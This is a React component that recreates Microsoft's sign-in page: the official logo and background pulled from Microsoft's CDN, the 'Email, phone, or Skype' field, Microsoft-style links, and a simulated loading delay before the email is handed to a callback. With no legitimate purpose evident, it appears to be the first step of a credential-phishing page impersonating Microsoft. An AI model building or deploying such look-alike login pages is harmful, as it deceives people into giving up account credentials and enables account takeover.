import React, { useState } from 'react';
import { useEffect, useRef } from 'react';

interface LoginFormProps {
  email?: string;
  onNext: (email: string) => void;
}

export function LoginForm({ email: initialEmail = '', onNext }: LoginFormProps) {
  const [email, setEmail] = useState(initialEmail);
  const [isLoading, setIsLoading] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // Set email from props if provided
    if (initialEmail) {
      setEmail(initialEmail);
      if (inputRef.current) {
        inputRef.current.value = initialEmail;
      }
    }
  }, [initialEmail]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!email) {
      return;
    }
    
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 800));
    setIsLoading(false);
    onNext(email);
  };

  return (
    <div className="min-h-screen" style={{
      backgroundColor: '#f5f5f5',
      backgroundImage: 'url("https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg")',
      backgroundSize: 'cover',
      backgroundPosition: 'center',
      backgroundRepeat: 'no-repeat',
      backgroundAttachment: 'fixed'
    }}>
      {/* Main Content */}
      <div className="flex items-center justify-center min-h-screen px-6 py-8">
        <div className="w-full max-w-lg">
          <div>
            <div className="ext-sign-in-box">
              {/* Microsoft Logo */}
              <div className="mb-6">
                <img 
                  className="h-6 w-auto" 
                  src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" 
                  alt="Microsoft" 
                />
              </div>
              
              <div className="mb-6">
                <h1 className="text-2xl font-light ms-text-primary mb-2">Sign in</h1>
              </div>

              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <div className="ms-input-container">
                    <input
                      ref={inputRef}
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      onFocus={() => setIsFocused(true)}
                      onBlur={() => setIsFocused(false)}
                      className="ms-input-field"
                      autoComplete="username"
                      required
                    />
                    <label className={`ms-input-label ${email || isFocused ? 'focused' : ''}`}>
                      Email, phone, or Skype
                    </label>
                  </div>
                </div>

                <div className="text-xs ms-text-secondary">
                  No account? <a href="#" className="ms-link">Create one!</a>
                </div>

                <div className="text-xs">
                  <a href="#" className="ms-link">Can't access your account?</a>
                </div>

                <div className="flex justify-end pt-4">
                  <button
                    type="submit"
                    className="ms-button-primary"
                  >
                    {isLoading ? (
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    ) : (
                      'Next'
                    )}
                  </button>
                </div>
              </form>
            </div>
            
            {/* Sign-in options box */}
            <div className="sign-in-options-box">
              <svg className="w-4 h-4 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v-2H7v-2H4a1 1 0 01-1-1v-1.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1721 9z" />
              </svg>
              <span className="text-sm text-gray-700">Sign-in options</span>
            </div>
          </div>
        </div>
      </div>
      {/* Footer */}
      <div className="fixed bottom-0 left-0 right-0 px-6 py-4 text-xs ms-text-secondary flex justify-center">
        <div className="flex space-x-4">
          <a href="#" className="ms-link text-xs">Terms of use</a>
          <a href="#" className="ms-link text-xs">Privacy & cookies</a>
          <span>...</span>
        </div>
      </div>
    </div>
  );
}